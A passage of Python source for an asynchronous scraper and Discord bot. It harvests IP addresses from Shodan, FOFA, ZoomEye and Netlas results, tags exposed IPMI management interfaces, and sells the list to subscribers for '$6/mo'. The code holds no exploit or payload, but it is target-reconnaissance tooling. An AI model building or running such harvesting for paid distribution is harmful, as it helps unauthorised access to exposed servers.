                logger.warning(f"Node {self.node_id}: Fetch attempt {attempt + 1} failed for {page_url}: Timeout error - {str(e)}")
                self.errors.append(f"Fetch {page_url} Attempt {attempt + 1}: Timeout error - {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
            except aiohttp.ClientError as e:
                logger.warning(f"Node {self.node_id}: Fetch attempt {attempt + 1} failed for {page_url}: Client error - {str(e)}")
                self.errors.append(f"Fetch {page_url} Attempt {attempt + 1}: Client error - {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
            except Exception as e:
                logger.warning(f"Node {self.node_id}: Fetch attempt {attempt + 1} failed for {page_url}: Unexpected error - {str(e)}")
                self.errors.append(f"Fetch {page_url} Attempt {attempt + 1}: Unexpected error - {str(e)}")
                if attempt < max_retries - 1:
                    await asyncio.sleep((2 ** attempt) + random.uniform(0.5, 1.5))
        logger.error(f"Node {self.node_id}: All {max_retries} fetch attempts failed for {page_url}")
        self.errors.append(f"Fetch {page_url}: All {max_retries} attempts failed")
        return (url, "")

    async def scan_url(self, session: aiohttp.ClientSession, url: str, max_pages: int = 1) -> None:
        try:
            is_search_engine = any(domain in url for domain in ["shodan.io", "fofa.info", "zoomeye.org", "app.netlas.io"])
            tasks = [self.fetch_page(session, url, page) for page in range(1, max_pages + 1)] if is_search_engine else [self.fetch_page(session, url)]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            ip_pattern = re.compile(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')
            new_ip_data = []
            for result in results:
                if isinstance(result, Exception):
                    logger.warning(f"Node {self.node_id}: Error in fetch task for {url}: {result}")
                    continue
                source_url, content = result
                if not content:
                    continue

                soup = await asyncio.get_event_loop().run_in_executor(None, BeautifulSoup, content, 'html.parser')
                html_text = soup.get_text(separator=' ')
                html_ips = set()
                for ip in ip_pattern.findall(html_text):
                    if self.is_valid_ip(ip):
                        html_ips.add(ip)

                css_ips = set()
                style_tags = soup.find_all('style')
                for style in style_tags:
                    css_content = style.string
                    if css_content:
                        for ip in ip_pattern.findall(css_content):
                            if self.is_valid_ip(ip):
                                css_ips.add(ip)

                css_links = soup.find_all('link', rel='stylesheet')
                for link in css_links:
                    css_url = link.get('href')
                    if css_url:
                        if not css_url.startswith('http'):
                            css_url = urljoin(source_url, css_url)
                        try:
                            async with session.get(css_url, timeout=ClientTimeout(total=10)) as css_response:
                                if css_response.status == 200:
                                    css_text = await css_response.text()
                                    for ip in ip_pattern.findall(css_text):
                                        if self.is_valid_ip(ip):
                                            css_ips.add(ip)
                        except Exception as e:
                            logger.debug(f"Node {self.node_id}: Failed to fetch CSS {css_url}: {type(e).__name__}")

                js_ips = set()
                script_tags = soup.find_all('script')
                for script in script_tags:
                    if script.string:
                        for ip in ip_pattern.findall(script.string):
                            if self.is_valid_ip(ip):
                                js_ips.add(ip)
                    src = script.get('src')
                    if src:
                        if not src.startswith('http'):
                            src = urljoin(source_url, src)
                        try:
                            async with session.get(src, timeout=ClientTimeout(total=10)) as js_response:
                                if js_response.status == 200:
                                    js_text = await js_response.text()
                                    for ip in ip_pattern.findall(js_text):
                                        if self.is_valid_ip(ip):
                                            js_ips.add(ip)
                        except Exception as e:
                            logger.debug(f"Node {self.node_id}: Failed to fetch JS {src}: {type(e).__name__}")

                current_ips = html_ips.union(css_ips).union(js_ips)
                new_ips = current_ips - self.all_ips

                if new_ips:
                    current_time = datetime.now(timezone.utc)
                    new_ip_data.extend({
                        "ip_address": ip,
                        "source_url": source_url,
                        "first_seen": current_time,
                        "node_id": self.node_id,
                        "type": "IPMI" if "ipmi" in source_url.lower() else "Website",
                        "source_type": ("HTML" if ip in html_ips else "CSS" if ip in css_ips else "JS")
                    } for ip in new_ips)

            if new_ip_data:
                await self.save_to_db_bulk(new_ip_data)
        except Exception as e:
            logger.error(f"Node {self.node_id}: Error scanning URL {url}: {e}")
            self.errors.append(f"Scan URL {url}: {str(e)}")
            logger.info(f"Node {self.node_id}: Continuing scrape cycle despite error")

    async def run(self):
        try:
            self.all_ips = set()
            for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips"):
                ip = row["ip_address"]
                if self.is_valid_ip(ip):
                    self.all_ips.add(ip)
                else:
                    logger.warning(f"Skipping invalid IP in database: {ip}")
            logger.info(f"Node {self.node_id}: Initialized with {len(self.all_ips)} valid IPs from database")
        except Exception as e:
            logger.error(f"Node {self.node_id}: Failed to initialize IPs from database: {e}")
            logger.info(f"Node {self.node_id}: Continuing scrape cycle despite error")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        }

        while True:
            try:
                if asyncio.get_event_loop().is_closed():
                    logger.error(f"Node {self.node_id}: Event loop closed, creating new loop")
                    asyncio.set_event_loop(asyncio.new_event_loop())

                logger.info(f"Node {self.node_id}: Starting scrape cycle with {len(self.urls)} URLs")
                async with aiohttp.ClientSession(headers=headers, connector=TCPConnector(limit=50)) as session:
                    if self.pending_ip_data:
                        logger.info(f"Node {self.node_id}: Retrying to save {len(self.pending_ip_data)} cached IPs")
                        pending_count = await self.save_to_db_bulk(self.pending_ip_data)
                        if pending_count > 0:
                            logger.info(f"Node {self.node_id}: Successfully saved {pending_count} cached IPs, clearing pending data")
                            self.pending_ip_data = []
                        else:
                            logger.warning(f"Node {self.node_id}: Failed to save cached IPs, keeping {len(self.pending_ip_data)} IPs pending")

                    for i in range(0, len(self.urls), self.batch_size):
                        batch_urls = self.urls[i:i + self.batch_size]
                        tasks = [
                            self.scan_url(
                                session,
                                url,
                                5 if any(d in url for d in ["shodan.io", "fofa.info", "zoomeye.org", "app.netlas.io"]) else 1
                            ) for url in batch_urls
                        ]
                        await asyncio.gather(*tasks, return_exceptions=True)

                    try:
                        db_manager.execute(
                            "INSERT OR REPLACE INTO nodes (node_id, status, ips_scraped, last_seen, urls) VALUES (?, ?, ?, ?, ?)",
                            (
                                self.node_id,
                                'active',
                                self.ips_scraped,
                                datetime.now(timezone.utc).isoformat(),
                                json.dumps(self.urls)
                            )
                        )
                        logger.info(f"Node {self.node_id}: Node status updated")
                    except Exception as e:
                        logger.error(f"Node {self.node_id}: Failed to update node status: {e}")
                        logger.info(f"Node {self.node_id}: Continuing scrape cycle despite error")

                logger.info(f"Node {self.node_id}: Completed scrape cycle, waiting 9 seconds")
                await asyncio.sleep(2)
            except Exception as e:
                logger.error(f"Node {self.node_id}: Scraper loop error: {e}")
                self.errors.append(f"Scraper Loop Error: {str(e)}")
                try:
                    db_manager.execute(
                        "UPDATE nodes SET status = ?, last_seen = ? WHERE node_id = ?",
                        (
                            'failed',
                            datetime.now(timezone.utc).isoformat(),
                            self.node_id
                        )
                    )
                except Exception as e:
                    logger.error(f"Node {self.node_id}: Failed to update node status to failed: {e}")
                await asyncio.sleep(30)

scraper = IPScraper(NODE_ID, URLS)

@bot.event
async def on_ready():
    logger.info(f'Bot connected as {bot.user}')
    print_startup_status(bot.user, db_manager.get_connection() is not None)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="IPMI Systems"))

    # Optional: Keep status channel if configured
    channel_id = CONFIG.get('status_channel_id')
    if channel_id:
        try:
            bot.update_channel = bot.get_channel(int(channel_id))
            if bot.update_channel is None:
                logger.error(f"Invalid or inaccessible status channel ID: {channel_id}")
            else:
                permissions = bot.update_channel.permissions_for(bot.get_guild(bot.update_channel.guild.id).me)
                if not (permissions.send_messages and permissions.embed_links and permissions.read_message_history):
                    logger.error(f"Bot lacks permissions in channel {bot.update_channel.name} (ID: {channel_id})")
        except ValueError:
            logger.error(f"Invalid status_channel_id in config.json: {channel_id}")
    else:
        logger.warning("No status_channel_id set in config.json")

    bot.loop.create_task(status_update_loop())

def is_owner():
    async def predicate(ctx):
        return ctx.author.id in CONFIG['owner_ids']
    return commands.check(predicate)

async def status_update_loop():
    while True:
        loop_start = datetime.now(timezone.utc)
        logger.info(f"Starting status update at {loop_start.strftime('%d/%m/%Y, %H:%M:%S')}")
        try:
            if not bot.is_ready() or bot.is_closed():
                logger.warning("Bot not ready or closed, skipping status update")
                await asyncio.sleep(40)
                continue
            if not hasattr(bot, 'update_channel') or not bot.update_channel:
                logger.warning("No status channel set, skipping status update")
                await asyncio.sleep(40)
                continue

            channel = bot.get_channel(bot.update_channel.id)
            if not channel or not isinstance(channel, discord.TextChannel):
                logger.error(f"Status channel {bot.update_channel.id} is invalid or deleted")
                bot.update_channel = None
                bot.last_status_message_id = None
                await asyncio.sleep(40)
                continue
            permissions = channel.permissions_for(channel.guild.me)
            if not (permissions.send_messages and permissions.embed_links and permissions.read_message_history):
                logger.error(f"Lacking permissions in status channel {channel.name} (ID: {channel.id})")
                await asyncio.sleep(40)
                continue

            ip_count_row = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")
            ip_count = ip_count_row[0] if ip_count_row else 0
            now = datetime.now(timezone.utc)
            embed = discord.Embed(
                title="DATABASE STATUS",
                color=discord.Color.default(),
                timestamp=now
            )
            embed.add_field(name="Timestamp", value=f"<t:{int(now.timestamp())}:R>", inline=False)
            embed.add_field(name="System Status", value=f"Database: {'Online' if db_manager.get_connection() else 'Offline'}", inline=False)
            embed.add_field(name="Total IPs", value=f"{ip_count}", inline=False)
            embed.set_footer(text=f"VERSION: {version}")

            try:
                if bot.last_status_message_id:
                    try:
                        message = await bot.update_channel.fetch_message(bot.last_status_message_id)
                        await message.edit(embed=embed)
                    except (discord.errors.NotFound, discord.errors.Forbidden):
                        message = await bot.update_channel.send(embed=embed)
                        bot.last_status_message_id = message.id
                else:
                    message = await bot.update_channel.send(embed=embed)
                    bot.last_status_message_id = message.id
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after or 5
                    logger.warning(f"Rate limited, retrying after {retry_after}s")
                    await asyncio.sleep(retry_after)
                    continue
                logger.error(f"Failed to send/edit status message: {e}")
            except Exception as e:
                logger.error(f"Unexpected error sending/editing status message: {e}")

            elapsed = (datetime.now(timezone.utc) - loop_start).total_seconds()
            sleep_time = max(0, 40 - elapsed)
            logger.info(f"Status update completed in {elapsed:.2f}s, sleeping for {sleep_time:.2f}s")
            await asyncio.sleep(sleep_time)
        except Exception as e:
            logger.error(f"Status update loop error: {str(e)}")
            await asyncio.sleep(40)

@bot.command(name='adduser')
@is_owner()
async def add_user(ctx, member: discord.Member):
    embed = discord.Embed(title="User Management", color=discord.Color.green())
    existing_user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (member.id,))
    if existing_user:
        embed.description = f"{member.name} is already registered!"
        embed.color = discord.Color.red()
    else:
        db_manager.execute(
            "INSERT INTO users (discord_id, has_permission, works, username) VALUES (?, ?, ?, ?)",
            (member.id, True, True, member.name)
        )
        embed.description = f"{member.name} added as a user!"
    await ctx.send(embed=embed)

@bot.command(name='removeuser')
@is_owner()
async def remove_user(ctx, member: discord.Member):
    embed = discord.Embed(title="User Management", color=discord.Color.red())
    existing_user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (member.id,))
    if not existing_user:
        embed.description = f"{member.name} is not registered!"
        embed.color = discord.Color.red()
    else:
        db_manager.execute("DELETE FROM users WHERE discord_id = ?", (member.id,))
        embed.description = f"{member.name} removed as a user!"
    await ctx.send(embed=embed)

@bot.command(name='setstatus')
@is_owner()
async def set_status_channel(ctx, channel: discord.TextChannel):
    embed = discord.Embed(title="|Status Channel Update", color=discord.Color.green())
    try:
        permissions = channel.permissions_for(ctx.guild.me)
        if not (permissions.send_messages and permissions.embed_links and permissions.read_message_history):
            embed.description = f"I lack permissions in {channel.mention}!"
            embed.color = discord.Color.red()
            await ctx.send(embed=embed)
            return

        bot.update_channel = channel
        bot.last_status_message_id = None

        CONFIG['status_channel_id'] = str(channel.id)
        with open('config_ipmi.json', 'w') as f:
            json.dump(CONFIG, f, indent=4)
        logger.info(f"Status channel updated to {channel.name} (ID: {channel.id})")

        embed.description = f"Status updates will now be sent to {channel.mention}!"
        await ctx.send(embed=embed)

        is_connected = db_manager.get_connection() is not None
        ip_count_row = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")
        ip_count = ip_count_row[0] if ip_count_row else 0
        now = datetime.now(timezone.utc)
        test_embed = discord.Embed(
            title="DATABASE STATUS",
            color=discord.Color.default(),
            timestamp=now
        )
        test_embed.add_field(name="Timestamp", value=f"<t:{int(now.timestamp())}:R>", inline=False)
        test_embed.add_field(name="System Status", value=f"Database: {'Online' if is_connected else 'Offline'}", inline=False)
        test_embed.add_field(name="Total IPs", value=f"{ip_count}", inline=False)
        test_embed.set_footer(text=f"VERSION: {version}")

        message = await channel.send(embed=test_embed)
        bot.last_status_message_id = message.id
    except Exception as e:
        embed.description = f"Failed to set status channel: {str(e)}"
        embed.color = discord.Color.red()
        await ctx.send(embed=embed)
        logger.error(f"Failed to set status channel: {str(e)}")

@bot.command(name='ips')
async def ips(ctx):
    if not await has_id_permission(ctx.author.id):
        await ctx.send("You are not allowed to use this bot, please purchase the subscription ($6/mo) to use the bot.")
        return

    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (ctx.author.id,))
    if not user or not user['works']:
        await ctx.send("Your IP access is disabled!")
        return

    try:
        scraped_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips")]
        ipmi_ips = [row['ip_address'] for row in db_manager.fetchall("SELECT ip_address FROM ipmi_ips")]
        ip_list = list(set(scraped_ips + ipmi_ips))
        if not ip_list:
            await ctx.send("No IPs registered!")
            return

        embed = discord.Embed(title="iPMI IPs", description=f"Total IPs in the database: {len(ip_list)}", color=discord.Color.default())
        embed.set_footer(text="Made with by hironull.lol")
        buffer = io.StringIO()
        buffer.write("\n".join(ip_list))
        buffer.seek(0)
        file = discord.File(buffer, filename="ips.txt")
        await ctx.send(embed=embed, file=file)
        buffer.close()
    except Exception as e:
        logger.error(f"Error fetching IPs: {e}")
        owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in CONFIG['owner_ids']])
        await ctx.send(f"Failed to fetch IPs! {owner_mentions} - DB issue!")

@bot.command()
async def ipinfo(ctx, ip: str):
    await ctx.message.delete()
    url = f"https://ipinfo.io/{ip}/json"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            data = await resp.json()
    if "bogon" in data:
        await ctx.author.send(" | Invalid IP")
        return
    country_code = data.get("country", "N/A")
    try:
        country_name = pycountry.countries.get(alpha_2=country_code).name
    except AttributeError:
        country_name = "N/A"
    embed = discord.Embed(title="IP Information", color=discord.Color.dark_red())
    embed.add_field(name="IP Address", value=data.get("ip", "N/A"), inline=False)
    embed.add_field(name="City", value=data.get("city", "N/A"), inline=False)
    embed.add_field(name="Region", value=data.get("region", "N/A"), inline=False)
    embed.add_field(name="Country", value=country_name, inline=False)
    embed.add_field(name="ISP", value=data.get("org", "N/A"), inline=False)
    await ctx.author.send(embed=embed)
    await ctx.send("IP details have been sent to your DMs.", delete_after=5)

async def has_id_permission(user_id: int) -> bool:
    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (user_id,))
    return user is not None and user['has_permission']

async def update_node_status():
    db_manager.execute(
        "INSERT OR REPLACE INTO nodes (node_id, status, last_seen) VALUES (?, ?, ?)",
        (NODE_ID, "active", datetime.now(timezone.utc).isoformat())
    )
    logger.info(f"Node {NODE_ID} status updated")

@bot.command(name='ping')
async def ping(ctx):
    try:
        command_start = time.time()
        api_latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title='Pong!',
            description=(
                '**Bot Information**\n\n'
                f'`Latency`: {api_latency}ms\n'
                f'`Ping`: Calculating...\n'
                f'`Prefix`: {bot.command_prefix}\n'
                f'`Reply Speed`: Calculating...'
            ),
            color=discord.Color.red()
        )
        embed.set_footer(text=f'Requested by {ctx.author}', icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
        embed.timestamp = datetime.now(timezone.utc)
        message = await ctx.send(embed=embed)
        ping_time = round((message.created_at.timestamp() - ctx.message.created_at.timestamp()) * 1000)
        reply_speed = round((time.time() - command_start), 3)
        embed.description = (
            '**Bot Information**\n\n'
            f'`Latency`: {api_latency}ms\n'
            f'`Ping`: {ping_time}ms\n'
            f'`Prefix`: {bot.command_prefix}\n'
            f'`Reply Speed`: {reply_speed} seconds'
        )
        await message.edit(embed=embed)
    except discord.errors.DiscordException as e:
        error_embed = discord.Embed(
            title='Error',
            description='An error occurred while processing the command.',
            color=discord.Color.red()
        )
        error_embed.add_field(name='Error', value=str(e), inline=False)
        await ctx.send(embed=error_embed)

async def run_bot_safely():
    try:
        await bot.start(CONFIG['discord_bot_token'])
    except Exception as e:
        print(f"{Fore.RED}[*] Could not log in or make a connection with discord bot, Starting to use ipmi_ips.txt.{Style.RESET_ALL}")
        logger.warning(f"Discord bot failed to start: {e}")

async def main():
    print_banner()
    await load_custom_config()
    await ensure_admin_account()
    if not await scraper.init_db():
        logger.critical(f"Node {NODE_ID}: Database initialization failed, continuing with caching")
    await update_node_status()
    db_manager.execute("DELETE FROM sessions")

    tasks = [asyncio.create_task(scraper.run())]

    if NODE_ID == "master":
        tasks.append(asyncio.create_task(run_bot_safely()))

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Shutdown requested via KeyboardInterrupt...{Style.RESET_ALL}")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        if scraper.ips_scraped > 0:
            print(f"\n{Fore.CYAN}[*] Total new IPs added to database this session: {scraper.ips_scraped}{Style.RESET_ALL}")
        logger.info("Shutdown complete.")
